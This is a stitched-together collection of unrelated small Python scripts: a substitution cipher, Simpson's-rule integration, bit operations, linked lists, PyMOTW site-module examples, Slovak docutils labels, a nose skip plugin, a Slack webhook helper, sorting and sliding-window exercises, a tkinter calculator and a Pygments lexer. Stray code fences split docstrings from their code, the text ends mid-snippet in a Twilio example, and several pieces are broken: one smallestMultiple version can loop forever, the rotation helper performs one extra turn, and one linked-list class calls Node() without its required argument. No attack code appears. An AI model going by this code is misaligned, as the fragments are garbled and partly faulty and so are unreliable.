    if resp.lower().startswith('e'):
        mode = 'encrypt'
        translated = encryptMessage(key, message)
    elif resp.lower().startswith('d'):
        mode = 'decrypt'
        translated = decryptMessage(key, message)

    print('\n%sion: \n%s' % (mode.title(), translated))

def checkValidKey(key):
    keyList = list(key)
    lettersList = list(LETTERS)
    keyList.sort()
    lettersList.sort()

    if keyList != lettersList:
        sys.exit('Error in the key or symbol set.')

def encryptMessage(key, message):
    """
    >>> encryptMessage('LFWOAYUISVKMNXPBDCRJTQEGHZ', 'Harshil Darji')
    'Ilcrism Olcvs'
    """
    return translateMessage(key, message, 'encrypt')

def decryptMessage(key, message):
    """
    >>> decryptMessage('LFWOAYUISVKMNXPBDCRJTQEGHZ', 'Ilcrism Olcvs')
    'Harshil Darji'
    """
    return translateMessage(key, message, 'decrypt')

def translateMessage(key, message, mode):
    translated = ''
    charsA = LETTERS
    charsB = key

    if mode == 'decrypt':
        charsA, charsB = charsB, charsA

    for symbol in message:
        if symbol.upper() in charsA:
            symIndex = charsA.find(symbol.upper())
            if symbol.isupper():
                translated += charsB[symIndex].upper()
            else:
                translated += charsB[symIndex].lower()
        else:
            translated += symbol

    return translated

def getRandomKey():
    key = list(LETTERS)
    random.shuffle(key)
    return ''.join(key)

if __name__ == '__main__':
    main()
````

```py
Numerical integration or quadrature for a smooth function f with known values at x_i

This method is the classical approach of suming 'Equally Spaced Abscissas'

method 2:
"Simpson Rule"
```

```py


def method_2(boundary, steps):
    # "Simpson Rule"
    # int(f) = delta_x/2 * (b-a)/3*(f1 + 4f2 + 2f_3 + ... + fn)
    h = (boundary[1] - boundary[0]) / steps
    a = boundary[0]
    b = boundary[1]
    x_i = make_points(a, b, h)
    y = 0.0
    y += (h / 3.0) * f(a)
    cnt = 2
    for i in x_i:
        y += (h / 3) * (4 - 2 * (cnt % 2)) * f(i)
        cnt += 1
    y += (h / 3.0) * f(b)
    return y


def make_points(a, b, h):
    x = a + h
    while x < (b - h):
        yield x
        x = x + h


def f(x):  # enter your function here
    y = (x - 0) * (x - 0)
    return y


def main():
    a = 0.0  # Lower bound of integration
    b = 1.0  # Upper bound of integration
    steps = 10.0  # define number of steps or resolution
    boundary = [a, b]  # define boundary of integration
    y = method_2(boundary, steps)
    print(f"y = {y}")


if __name__ == "__main__":
    main()

from collections import Counter


def singleNumber(nums):
    """
    given a list of integer with every element appears twice and a single number appears once, return the value of the
    single number
    """
    count = Counter(nums)
    for k, v in count.items():
        if v == 1:
            return k


print(singleNumber([2, 2, 4, 1, 5]))

#!/usr/bin/env python3
```

````pyProvide the functionality to manipulate a single bit."""


def set_bit(number: int, position: int) -> int:
    """
    Set the bit at position to 1.

    Details: perform bitwise or for given number and X.
    Where X is a number with all the bits – zeroes and bit on given
    position – one.

    >>> set_bit(0b1101, 1) # 0b1111
    15
    >>> set_bit(0b0, 5) # 0b100000
    32
    >>> set_bit(0b1111, 1) # 0b1111
    15
    """
    return number | (1 << position)


def clear_bit(number: int, position: int) -> int:
    """
    Set the bit at position to 0.

    Details: perform bitwise and for given number and X.
    Where X is a number with all the bits – ones and bit on given
    position – zero.

    >>> clear_bit(0b10010, 1) # 0b10000
    16
    >>> clear_bit(0b0, 5) # 0b0
    0
    """
    return number & ~(1 << position)


def flip_bit(number: int, position: int) -> int:
    """
    Flip the bit at position.

    Details: perform bitwise xor for given number and X.
    Where X is a number with all the bits – zeroes and bit on given
    position – one.

    >>> flip_bit(0b101, 1) # 0b111
    7
    >>> flip_bit(0b101, 0) # 0b100
    4
    """
    return number ^ (1 << position)


def is_bit_set(number: int, position: int) -> bool:
    """
    Is the bit at position set?

    Details: Shift the bit at position to be the first (smallest) bit.
    Then check if the first bit is set by anding the shifted number with 1.

    >>> is_bit_set(0b1010, 0)
    False
    >>> is_bit_set(0b1010, 1)
    True
    >>> is_bit_set(0b1010, 2)
    False
    >>> is_bit_set(0b1010, 3)
    True
    >>> is_bit_set(0b0, 17)
    False
    """
    return ((number >> position) & 1) == 1


def get_bit(number: int, position: int) -> int:
    """
    Get the bit at the given position

    Details: perform bitwise and for the given number and X,
    Where X is a number with all the bits – zeroes and bit on given position – one.
    If the result is not equal to 0, then the bit on the given position is 1, else 0.

    >>> get_bit(0b1010, 0)
    0
    >>> get_bit(0b1010, 1)
    1
    >>> get_bit(0b1010, 2)
    0
    >>> get_bit(0b1010, 3)
    1
    """
    return int((number & (1 << position)) != 0)


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# Given a non-empty array of integers, every element appears twice except for one. Find that single one.
#
# Note:
#
# Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?
#
# Example 1:
#
# Input: [2,2,1]
# Output: 1
# Example 2:
#
# Input: [4,1,2,1,2]
# Output: 4


class Solution:
    def singleNumber(self, nums):
        res = 0
        for num in nums:
            res = res ^ num

        return res

#!/usr/bin/env python3```


```py
Build a simple bare-minimum quantum circuit that starts with a single
qubit (by default, in state 0), runs the experiment 1000 times, and
finally prints the total count of the states finally observed.
Qiskit Docs: https://qiskit.org/documentation/getting_started.html```


```py

import qiskit as q


def single_qubit_measure(qubits: int, classical_bits: int) -> q.result.counts.Counts:
    """
    >>> single_qubit_measure(1, 1)
    {'0': 1000}
    """
    # Use Aer's qasm_simulator
    simulator = q.Aer.get_backend("qasm_simulator")

    # Create a Quantum Circuit acting on the q register
    circuit = q.QuantumCircuit(qubits, classical_bits)

    # Map the quantum measurement to the classical bits
    circuit.measure([0], [0])

    # Execute the circuit on the qasm simulator
    job = q.execute(circuit, simulator, shots=1000)

    # Return the histogram data of the results of the experiment.
    return job.result().get_counts(circuit)


if __name__ == "__main__":
    print(f"Total count for various states are: {single_qubit_measure(1, 1)}")

# Cyclically rotate an array by one
# Input:
# N = 5
# A[] = {1, 2, 3, 4, 5}
# Output:
# 5 1 2 3 4


def SingleCyclicallyRotate(arr, n):
    temp = arr[n - 1]
    for i in range(n - 1, 0, -1):
        arr[i] = arr[i - 1]
    arr[0] = temp
    return arr


def CyclicallyRotate(arr, turns):
    for j in range(turns + 1):
        SingleCyclicallyRotate(arr, len(arr))
    return arr


arr = [1, 2, 3, 4, 5]
turns = 6
print(CyclicallyRotate(arr, turns))

from __future__ import print_function


class Node:  # create a Node
    def __init__(self, data):
        self.data = data  # given data
        self.next = None  # given next to None


class Linked_List:
    def insert_tail(Head, data):
        if Head.next is None:
            Head.next = Node(data)
        else:
            Head.next.insert_tail(data)

    def insert_head(Head, data):
        tamp = Head
        if tamp is None:
            newNod = Node()  # create a new Node
            newNod.data = data
            newNod.next = None
            Head = newNod  # make new node to Head
        else:
            newNod = Node()
            newNod.data = data
            newNod.next = Head  # put the Head at NewNode Next
            Head = newNod  # make a NewNode to Head
        return Head

    def printList(Head):  # print every node data
        tamp = Head
        while tamp is not None:
            print(tamp.data)
            tamp = tamp.next

    def delete_head(Head):  # delete from head
        if Head is not None:
            Head = Head.next
        return Head  # return new Head

    def delete_tail(Head):  # delete from tail
        if Head is not None:
            tamp = Node()
            tamp = Head
            while tamp.next.next is not None:  # find the 2nd last element
                tamp = tamp.next
            # delete the last element by give next None to 2nd last Element
            tamp.next = None
        return Head

    def isEmpty(Head):
        return Head is None  # Return if Head is none

    def reverse(Head):
        prev = None
        current = Head

        while current:
            # Store the current node's next node.
            next_node = current.next
            # Make the current node's next point backwards
            current.next = prev
            # Make the previous node be the current node
            prev = current
            # Make the current node the next node (to progress iteration)
            current = next_node
        # Return prev in order to put the head at the end
        Head = prev

# create a Node Class
class Node:
    def __init__(self, value=None, next_node=None):
        # set the initial value of our node
        self.value = value

        # set a ref to the next node
        self.next_node = next_node

    def get_value(self):
        return self.value

    def get_next(self):
        return self.next_node

    def set_next(self, new_node):
        self.next_node = new_node



class LinkedList:
    def __init__(self):
        # ref to head of list
        self.head = None
        #ref to tail of list
        self.tail = None

    def add_to_tail(self, value):
        # wrap the input value in a new node
        new_node = Node(value, None)

        # check if there is no head (is the list empty)
        if not self.head:
            # if it is empty then we will set both the head and the tail to the new node
            self.head = new_node
            self.tail = new_node
        # otherwise (we have a non empty list)
        else:
            # set the current tails next ref to our new node
            self.tail.next = new_node
            # set lists tail ref to our new node
            self.tail = new_node

    def remove_head(self):
        # if the list is empty then return None
        if not self.head:
            return None

        # if the head has no next (single element)
        if not self.head.get_next():
            # get a ref to the current head
            head = self.head
            # del the lists head ref
            self.head = None
            # make sure we set tail ref to None
            self.tail = None

            # return the value of the current heads next
            return head.get_value()

        # otherwise we have more than one element in our list
        # store the value
        value = self.head.get_value()
        # set the head ref to the current heads next node in the list
        self.head = self.head.get_next()
        # return the stored value
        return value


    def contains(self, value):
        # if there is no head we have an empty list
        if not self.head:
            # return None
            return None

        # get ref to the current node and this will be update when we traverse
        current_node = self.head

        # iterate over the list while current is not None
        while current_node:
            # if current value matches target value
            if current_node.get_value() == value:
                # return True
                return True
            # update our current node to the current nodes next (increment node)
            current_node = current_node.get_next()

        # return False
        return False
# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#
# Ignore flake8 error about redefined mymodule
# flake8: noqa```


```pyAdd site import directory containing regular python modules.```


```py

#end_pymotw_header
import site
import os
import sys

script_directory = os.path.dirname(__file__)
module_directory = os.path.join(script_directory, sys.argv[1])

try:
    import mymodule
except ImportError as err:
    print('Could not import mymodule:', err)

print()
before_len = len(sys.path)
site.addsitedir(module_directory)
print('New paths:')
for p in sys.path[before_len:]:
    print(p.replace(os.getcwd(), '.'))  # shorten dirname

print()
import mymodule

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCheck whether user site directory is enabled.```


```py

#end_pymotw_header
import site

status = {
    None: 'Disabled for security',
    True: 'Enabled',
    False: 'Disabled by command-line option',
}

print('Flag   :', site.ENABLE_USER_SITE)
print('Meaning:', status[site.ENABLE_USER_SITE])

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyThe default import path from site```


```py

#end_pymotw_header
import sys
import os
import site

if 'Windows' in sys.platform:
    SUFFIXES = [
        '',
        'lib/site-packages',
    ]
else:
    SUFFIXES = [
        'lib/python{}/site-packages'.format(sys.version[:3]),
        'lib/site-python',
    ]

print('Path prefixes:')
for p in site.PREFIXES:
    print('  ', p)

for prefix in sorted(set(site.PREFIXES)):
    print()
    print(prefix)
    for suffix in SUFFIXES:
        print()
        print(' ', suffix)
        path = os.path.join(prefix, suffix).rstrip(os.sep)
        print('   exists :', os.path.exists(path))
        print('   in path:', path in sys.path)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRun in with_sitecustomize directory.```


```py

#end_pymotw_header
import sys

print('Running main program from\n{}'.format(sys.argv[0]))

print('End of path:', sys.path[-1])

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyShow the user base directory.```


```py

#end_pymotw_header
import site

print('Base:', site.USER_BASE)
print('Site:', site.USER_SITE)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRun in with_usercustomize directory.```


```py

#end_pymotw_header
import sys

print('Running main program from\n{}'.format(sys.argv[0]))

print('End of path:', sys.path[-1])

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyExample sitecustomize.py```


```py

#end_pymotw_header
print('Loading sitecustomize.py')

import site
import platform
import os
import sys

path = os.path.join('/opt',
                    'python',
                    sys.version[:3],
                    platform.platform(),
                    )
print('Adding new path', path)

site.addsitedir(path)

# $Id: sk.py 4564 2006-05-21 20:44:42Z wiemann $
# Author: Miroslav Vasko <zemiak@zoznam.sk>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Slovak-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = 'reStructuredText'

labels = {
      'author': u'Autor',
      'authors': u'Autori',
      'organization': u'Organiz\u00E1cia',
      'address': u'Adresa',
      'contact': u'Kontakt',
      'version': u'Verzia',
      'revision': u'Rev\u00EDzia',
      'status': u'Stav',
      'date': u'D\u00E1tum',
      'copyright': u'Copyright',
      'dedication': u'Venovanie',
      'abstract': u'Abstraktne',
      'attention': u'Pozor!',
      'caution': u'Opatrne!',
      'danger': u'!NEBEZPE\u010cENSTVO!',
      'error': u'Chyba',
      'hint': u'Rada',
      'important': u'D\u00F4le\u017Eit\u00E9',
      'note': u'Pozn\u00E1mka',
      'tip': u'Tip',
      'warning': u'Varovanie',
      'contents': u'Obsah'}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
      u'autor': 'author',
      u'autori': 'authors',
      u'organiz\u00E1cia': 'organization',
      u'adresa': 'address',
      u'kontakt': 'contact',
      u'verzia': 'version',
      u'rev\u00EDzia': 'revision',
      u'stav': 'status',
      u'd\u00E1tum': 'date',
      u'copyright': 'copyright',
      u'venovanie': 'dedication',
      u'abstraktne': 'abstract'}```


```pySlovak (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [';', ',']```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""
````

````py
This plugin installs a SKIP error class for the SkipTest exception.
When SkipTest is raised, the exception will be logged in the skipped
attribute of the result, 'S' or 'SKIP' (verbose) will be output, and
the exception will not be counted as an error or failure. This plugin
is enabled by default but may be disabled with the ``--no-skip`` option.```


```py

from nose.plugins.errorclass import ErrorClass, ErrorClassPlugin


# on SkipTest:
#  - unittest SkipTest is first preference, but it's only available
#    for >= 2.7
#  - unittest2 SkipTest is second preference for older pythons.  This
#    mirrors logic for choosing SkipTest exception in testtools
#  - if none of the above, provide custom class
try:
    from unittest.case import SkipTest
except ImportError:
    try:
        from unittest2.case import SkipTest
    except ImportError:
        class SkipTest(Exception):
            """Raise this exception to mark a test as skipped.
            """
            pass


class Skip(ErrorClassPlugin):
    """
    Plugin that installs a SKIP error class for the SkipTest
    exception.  When SkipTest is raised, the exception will be logged
    in the skipped attribute of the result, 'S' or 'SKIP' (verbose)
    will be output, and the exception will not be counted as an error
    or failure.
    """
    enabled = True
    skipped = ErrorClass(SkipTest,
                         label='SKIP',
                         isfailure=False)

    def options(self, parser, env):
        """
        Add my options to command line.
        """
        env_opt = 'NOSE_WITHOUT_SKIP'
        parser.add_option('--no-skip', action='store_true',
                          dest='noSkip', default=env.get(env_opt, False),
                          help="Disable special handling of SkipTest "
                          "exceptions.")

    def configure(self, options, conf):
        """
        Configure plugin. Skip plugin is enabled by default.
        """
        if not self.can_configure:
            return
        self.conf = conf
        disable = getattr(options, 'noSkip', False)
        if disable:
            self.enabled = False


# Created by sarathkaul on 12/11/19

import requests


def send_slack_message(message_body: str, slack_url: str) -> None:
    headers = {"Content-Type": "application/json"}
    response = requests.post(slack_url, json={"text": message_body}, headers=headers)
    if response.status_code != 200:
        raise ValueError(
            f"Request to slack returned an error {response.status_code}, "
            f"the response is:\n{response.text}"
        )


if __name__ == "__main__":
    # Set the slack url to the one provided by Slack when you create the webhook at
    # https://my.slack.com/services/new/incoming-webhook/
    send_slack_message("<YOUR MESSAGE BODY>", "<SLACK CHANNEL URL>")

#! /usr/bin/env python2
# -*- coding: utf-8; mode: python -*-```


```py A tiny Python script to call sleep for a random time, drawn from a Poisson distribution of a certain mean time.

Requirements:
- numpy.random (poisson) is needed.

About:
- *Date:* 20/02/2017.
- *Author:* Lilian Besson, (C) 2017.
- *Licence:* MIT Licence (http://lbesson.mit-license.org).```


```py

# Python 2 compatibility if needed
from __future__ import print_function, division

import sys
from time import sleep
from numpy.random import poisson

MINUTE = 60
MEAN_TIME = 3 * MINUTE

# --- Main script

if __name__ == "__main__":
    mean_time = int(sys.argv[1]) if len(sys.argv) > 1 else MEAN_TIME
    waiting_time = poisson(mean_time)
    print("Sleeping for {:.3g} seconds ...".format(waiting_time))  # DEBUG
    sys.exit(sleep(waiting_time))

# End of sleep-poisson-time.py

# Alarm in Python
# Playing Sound on youtube to wake the person up
# I havent really battle tested the program so it might contain bugs
# If you come accross the bugs inform me

from time import sleep, ctime
import datetime
import webbrowser
import random

now = datetime.datetime.now()
linksToSounds = [
    "https://www.youtube.com/watch?v=6pR5cyH63mA",
    "https://www.youtube.com/watch?v=e12KryuLcbs",
    "https://www.youtube.com/watch?v=nbjwmC8K4K4",
    "https://www.youtube.com/watch?v=UqSww10eeKw",
    "https://www.youtube.com/watch?v=9f06QZCVUHg",
    "https://www.youtube.com/watch?v=kffacxfA7G4",
]  # remember to add links and test the code


def alarm(h, m, s):
    timeToSleep = h * 3600 + m * 60 + s
    sleepingTime = sleep(timeToSleep)
    playSound = webbrowser.open_new(random.choice(linksToSounds))


# Main code
print(ctime(), "\n")
startOrEnd = str(input("Set alarm or End : "))
if startOrEnd.strip() == "Set alarm":
    hours = int(input("Hours : "))
    minutes = int(input("Minutes : "))
    seconds = int(input("Seconds : "))
    print("Alarm started at %s : %s" % (now.hour, now.minute))
    print(alarm(hours, minutes, seconds))
    wakedUp = False
    while wakedUp == False:
        get = str(input("Have you waked up : "))
        if get == "Yes":
            print("Good")
            wakedUp = True
        else:
            sleepMoreTime = sleep(300)  # playing sound again in 5 minutes
            playSoundAgain = webbrowser.open_new(random.choice(linksToSounds))
            continue

else:
    quit()

a = [2, 4, 1, 7, 9, 6]

# Output the second element: 4:
print(a[1])

# Output the second-to-last element: 9
print(a[len(a) - 2])

# Output the last three elements in the array: [7, 9, 6]
print(a[-3:])

# Output the two middle elements in the array: [1, 7]
print(a[slice(2, 4)])  # decided to use slice() for a change

# Output every element except the first one: [4, 1, 7, 9, 6]
print(a[1:])

# Output every element except the last one: [2, 4, 1, 7, 9]
print(a[:-1])

# For string s...

s = "Hello, world!"

# Output just the 8th-12th characters: "world"
print(s[7:12])

'''
Input: a List of integers as well as an integer `k` representing the size of the sliding window
Returns: a List of integers
'''
from collections import deque

def sliding_window_max(nums, k):
    max_vals = []
    q = deque()
    # remove all elems from a queue
    for i, n in enumerate(nums):
        while len(q) > 0 and n > q[-1]:
            q.pop()

        q.append(n)

        # calc the window range
        window_range = i - k + 1

        # as long as our windows range == k, then we will add elements to the queue
        if window_range >= 0:
            # add the max elem (in this case 1st in the queue) to the max_vals
            max_vals.append(q[0])

            # check num on the left needs to be evicted
            # if so take it out of the start of the queue
            if nums[window_range] == q[0]:
                q.popleft()

    return max_vals





    # # Your code here
    # max_vals = [0 for _ in range(len(nums) - k + 1)]

    # for i in range(len(max_vals)):
    #     current_elem = nums[i]

    #     for j in range(1, k):
    #         if nums[i + j] > current_elem:
    #             current_elem = nums[i + j]

    #     max_vals[i] = current_elem


    # return max_vals


if __name__ == '__main__':
    # Use the main function here to test out your implementation
    arr = [1, 3, -1, -3, 5, 3, 6, 7]
    k = 3

    print(f"Output of sliding_window_max function is: {sliding_window_max(arr, k)}")

# Given an array nums, there is a sliding window of size k which is moving
# from the very left of the array to the very right. You can only see the k
# numbers in the window. Each time the sliding window moves right by one position.
# Return the max sliding window.

# Input: nums = [1,3,-1,-3,5,3,6,7], and k = 3
# Output: [3,3,5,5,6,7]
# Explanation:
#
# Window position                Max
# ---------------               -----
# [1  3  -1] -3  5  3  6  7       3
#  1 [3  -1  -3] 5  3  6  7       3
#  1  3 [-1  -3  5] 3  6  7       5
#  1  3  -1 [-3  5  3] 6  7       5
#  1  3  -1  -3 [5  3  6] 7       6
#  1  3  -1  -3  5 [3  6  7]      7
#
# Note:
# You may assume k is always valid, 1 ≤ k ≤ input array's size for non-empty array.
#
# Follow up:
# Could you solve it in linear time?
import collections


class Solution:
    def maxSlidingWindow(self, nums, k):
        # if len(nums) == 0:
        #     return []
        # length = len(nums) - k
        # arr = []
        # for i in range(length + 1):
        #     arr.append(max(nums[i:i + k]))
        #
        # return arr

        queue = collections.deque()
        slid_max = []
        for i in nums:
            queue.append(i)
            if len(queue) > k:
                queue.popleft()
            if len(queue) == k:
                slid_max.append(max(queue))

        return slid_max
````

````py
Slowsort is a sorting algorithm. It is of humorous nature and not useful.
It's based on the principle of multiply and surrender,
a tongue-in-cheek joke of divide and conquer.
It was published in 1986 by Andrei Broder and Jorge Stolfi
in their paper Pessimal Algorithms and Simplexity Analysis
(a parody of optimal algorithms and complexity analysis).

Source: https://en.wikipedia.org/wiki/Slowsort```


```py

from typing import Optional


def slowsort(
    sequence: list, start: Optional[int] = None, end: Optional[int] = None
) -> None:
    """
    Sorts sequence[start..end] (both inclusive) in-place.
    start defaults to 0 if not given.
    end defaults to len(sequence) - 1 if not given.
    It returns None.
    >>> seq = [1, 6, 2, 5, 3, 4, 4, 5]; slowsort(seq); seq
    [1, 2, 3, 4, 4, 5, 5, 6]
    >>> seq = []; slowsort(seq); seq
    []
    >>> seq = [2]; slowsort(seq); seq
    [2]
    >>> seq = [1, 2, 3, 4]; slowsort(seq); seq
    [1, 2, 3, 4]
    >>> seq = [4, 3, 2, 1]; slowsort(seq); seq
    [1, 2, 3, 4]
    >>> seq = [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]; slowsort(seq, 2, 7); seq
    [9, 8, 2, 3, 4, 5, 6, 7, 1, 0]
    >>> seq = [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]; slowsort(seq, end = 4); seq
    [5, 6, 7, 8, 9, 4, 3, 2, 1, 0]
    >>> seq = [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]; slowsort(seq, start = 5); seq
    [9, 8, 7, 6, 5, 0, 1, 2, 3, 4]
    """
    if start is None:
        start = 0

    if end is None:
        end = len(sequence) - 1

    if start >= end:
        return

    mid = (start + end) // 2

    slowsort(sequence, start, mid)
    slowsort(sequence, mid + 1, end)

    if sequence[end] < sequence[mid]:
        sequence[end], sequence[mid] = sequence[mid], sequence[end]

    slowsort(sequence, start, end - 1)


if __name__ == "__main__":
    from doctest import testmod

    testmod()

def smallest_missing(arr, left, right):
    """
        run a binary search on our sorted list
        because we know that the input should already be sorted
        and this would give us a O(log n) time complexity
        over doing a linear search that would yield a time complexity of O(n)
    """

    # check if left is greater than right
    if left > right:
        # if so return left
        return left


    # work out where we want to split the array (mid_point)
    mid_point = left + (right - left) // 2

    # check if the mid_point value is the same as teh mid_point index
    if arr[mid_point] == mid_point:
        # do a recursive call to the right hand side of the array
        return smallest_missing(arr, mid_point + 1, right)
    # otherwise
    else:
        # do a recursive call to the left hand side of the array
        return smallest_missing(arr, left, mid_point - 1)

````

````py
# here is a working solution from Vince Williams
def smallest(arr):
    for ind, num in enumerate(arr):
        if num != ind:
            return ind
    return (arr[-1] + 1)
print(smallest([0, 1, 2, 6, 9, 11, 15]))
print(smallest([1, 2, 3, 4, 6, 9, 11, 15]))
print(smallest([0, 1, 2, 3, 4, 5, 6]))```


```py

if __name__ == '__main__':
    A = [0, 1, 2, 6, 9, 11, 15]

    print(f"The smallest Missing Element is {smallest_missing(A, 0, len(A) - 1)}")  # => 3

    A = [1, 2, 3, 4, 6, 9, 11, 15]

    print(f"The smallest Missing Element is {smallest_missing(A, 0, len(A) - 1)}")  # => 0

    A = [0, 1, 2, 3, 4, 5, 6]

    print(f"The smallest Missing Element is {smallest_missing(A, 0, len(A) - 1)}")  # => 7



# def smallestMultiple(l, r):
#    for i in range(1,8**7):
#        s = True
#        for j in range(l, r+1):
#            if i%j!=0:
#                s = False
#        if s:
#            return i


def smallestMultiple(l, r):
    for i in range(1, 16):
        for j in range(l, r + 1):
            while True:
                if i % j != 0:
                    break
            return i
````

````py
Smallest multiple

2520 is the smallest number that can be divided by each of the numbers from 1 to 10 without any remainder.
What is the smallest positive number that is evenly divisible by all of the numbers from A to B?

=========================================
The solution is the least common multiple for more than 2 numbers (in this case all numbers from "start" to "end")
    Time Complexity:    O(N)    , N = start - end, GCD complexity is O(Log min(a, b))
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def smallest_multiple(start, end):
    result = 1

    for k in range(start, end + 1):
        result = lcm(max(result, k), min(result, k))

    return result


# least common multiple
def lcm(a, b):
    return a * b // gcd(a, b)


# Greatest common divisor (euclidian algorithm, fast algorithm)
# https://en.wikipedia.org/wiki/Euclidean_algorithm
# For more than 2 numbers: gcd(a, b, c) = gcd(a, gcd(b, c)) or gcd(gcd(a, b), c) or gcd(gcd(a, c), b)
def gcd(a, b):
    while b != 0:
        a, b = b, a % b
    return a


###########
# Testing #
###########

# Test 1
# Correct result => 2520
print(smallest_multiple(1, 10))

# Test 2
# Correct result => 232792560
print(smallest_multiple(1, 20))

from tkinter import *
#function for addition
def add(a,b):
    return a + b
#function for subtraction
def sub(a,b):
    return a - b
#function for multiplication
def mul(a,b):
    return a * b
#function for division
def div(a,b):
    return a / b
#function for modulo
def mod(a,b):
    return a % b
#function for l.c.m
def lcm(a,b):
    L = a if a>b else b
    while L <= a*b:
        if L%a == 0 and L%b == 0:
            return L
        L+=1
#function for h.c.f.
def hcf(a,b):
    H = a if a<b else b
    while H >= 1:
        if a%H == 0 and b%H == 0:
            return H
        H-=1
#function to extract the needed thing only
def extract_from_text(text):
    l = []
    for t in text.split(' '):
        try:
            l.append(float(t))
        except ValueError:
            pass
    return l

def calculate():
    text = textin.get()
    for word in text.split(' '):
        if word.upper() in operations.keys():
            try:
                l = extract_from_text(text)
                r = operations[word.upper()](l[0] , l[1])
                list.delete(0,END)
                list.insert(END,r)
            except:
                list.delete(0,END)
                list.insert(END,'something went wrong please enter again')
            finally:
                break
        elif word.upper() not in operations.keys():
            list.delete(0,END)
            list.insert(END,'something went wrong please enter again')
#for getting the proper function through different keywords
operations = {'ADD':add , 'ADDITION':add , 'SUM':add , 'PLUS':add ,
                'SUB':sub , 'DIFFERENCE':sub , 'MINUS':sub , 'SUBTRACT':sub,
                 'LCM':lcm , 'HCF':hcf , 'PRODUCT':mul , 'MULTIPLICATION':mul,
                 'MULTIPLY':mul , 'DIVISION':div , 'DIV':div ,'DIVIDE':div, 'MOD':mod ,
                  'REMANDER':mod , 'MODULUS':mod}

win = Tk()
win.geometry('500x300')
win.title('Smart Helper')
win.configure(bg='green')

l1 = Label(win , text='Hello there ,I am a smart calculator',width=30 , padx=3)
l1.place(x=140,y=10)
l2 = Label(win , text='Thank you for using me !!!' , padx=3)
l2.place(x=180,y=250)
l3 = Label(win , text='What can i help you' , padx=3)
l3.place(x=176,y=40)

textin = StringVar()
e1 = Entry(win , width=30 , textvariable = textin)
e1.place(x=140,y=70)

b1 = Button(win , text='Find this' ,command=calculate)
b1.place(x=200,y=100)

list = Listbox(win,width=20,height=3)
list.place(x=170,y=125)

win.mainloop()
````

````py
    pygments.lexers.smithy
    ~~~~~~~~~~~~~~~~~~~~~~

    Lexers for the Smithy IDL.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

import re

from pygments.lexer import RegexLexer, bygroups, words
from pygments.token import Text, Comment, Keyword, Name, String, \
    Number, Whitespace, Punctuation

__all__ = ['SmithyLexer']


class SmithyLexer(RegexLexer):
    """
    For Smithy IDL

    .. versionadded:: 2.10
    """
    name = 'Smithy'
    filenames = ['*.smithy']
    aliases = ['smithy']

    flags = re.MULTILINE | re.UNICODE
    unquoted = r'[A-Za-z0-9_\.#$-]+'
    identifier = r"[A-Za-z0-9_\.#$-]+"

    simple_shapes = (
        'use', 'byte', 'short', 'integer', 'long', 'float', 'document',
        'double', 'bigInteger', 'bigDecimal', 'boolean', 'blob', 'string',
        'timestamp',
    )

    aggregate_shapes = (
       'apply', 'list', 'map', 'set', 'structure', 'union', 'resource',
       'operation', 'service', 'trait'
    )

    tokens = {
        'root': [
            (r'///.*$', Comment.Multiline),
            (r'//.*$', Comment),
            (r'@[0-9a-zA-Z\.#-]*', Name.Decorator),
            (r'(=)', Name.Decorator),
            (r'^(\$version)(:)(.+)',
                bygroups(Keyword.Declaration, Name.Decorator, Name.Class)),
            (r'^(namespace)(\s+' + identifier + r')\b',
                bygroups(Keyword.Declaration, Name.Class)),
            (words(simple_shapes,
                   prefix=r'^', suffix=r'(\s+' + identifier + r')\b'),
                bygroups(Keyword.Declaration, Name.Class)),
            (words(aggregate_shapes,
                   prefix=r'^', suffix=r'(\s+' + identifier + r')'),
                bygroups(Keyword.Declaration, Name.Class)),
            (r'^(metadata)(\s+.+)(\s*)(=)',
                bygroups(Keyword.Declaration, Name.Class, Whitespace, Name.Decorator)),
            (r"(true|false|null)", Keyword.Constant),
            (r"(-?(?:0|[1-9]\d*)(?:\.\d+)?(?:[eE][+-]?\d+)?)", Number),
            (identifier + ":", Name.Label),
            (identifier, Name.Variable.Class),
            (r'\[', Text, "#push"),
            (r'\]', Text, "#pop"),
            (r'\(', Text, "#push"),
            (r'\)', Text, "#pop"),
            (r'\{', Text, "#push"),
            (r'\}', Text, "#pop"),
            (r'"{3}(\\\\|\n|\\")*"{3}', String.Doc),
            (r'"(\\\\|\n|\\"|[^"])*"', String.Double),
            (r"'(\\\\|\n|\\'|[^'])*'", String.Single),
            (r'[:,]+', Punctuation),
            (r'\s+', Whitespace),
        ]
    }

#!/usr/bin/env python3
# -*- coding: utf8 -*-

from time import time
import numpy as np
import numba


def smooth_nojit(u, a):
    y = np.zeros_like(u)
    y[0] = (1 - a) * u[0]
    for k in range(1, len(u)):
        y[k] = a * y[k - 1] + (1 - a) * u[k]
    return y


smooth_jit = numba.jit(smooth_nojit)
# <- factor ×100 speed-up!


if __name__ == "__main__":
    print("For 1e6 points...")
    u = np.random.randn(int(1e6), 1)
    a = 0.95
    start = time()
    smooth_nojit(u, a)
    print(f"No jit: {time() - start:.3g} seconds")
    start = time()
    smooth_jit(u, a)
    print(f"With Numba jit: {time() - start:.3g} seconds")

# Download the helper library from https://www.twilio.com/docs/python/install
import os
from twilio.rest import Client

# Create Virtual Twilio Number (Trail Account)
VIRTUAL_TWILIO_NUMBER = "your virtual twilio number"

# Verify Your Personal Phone Number with Twilio (Trail Account)
